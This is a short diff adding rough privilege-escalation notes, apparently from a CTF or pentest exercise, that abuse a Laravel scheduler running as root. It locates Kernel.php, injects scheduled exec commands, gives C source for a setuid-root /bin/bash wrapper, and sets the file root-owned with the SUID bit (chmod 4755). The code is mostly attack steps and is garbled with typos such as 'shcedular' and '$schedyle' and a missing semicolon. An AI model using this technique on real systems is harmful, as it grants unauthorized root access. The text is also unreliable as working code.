@@ -1,0 +1,19 @@
+find / -name Kernel.php 2>/dev/null
+Protect function shcedular(Schedule $schedule)
+{
+ $schedyle->exec('touch /tmp/sheri')->everyMinute();
+ }
+ 
+ FOr making setuid 0 program
+ int main(void)
+ {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash")
+    }
+   
+   Protect function shcedular(Schedule $schedule)
+{
+ $schedyle->exec('chown root:root /tmp/sheri; chmod 4755 /tmp/sheri')->everyMinute();
+ }
+ 
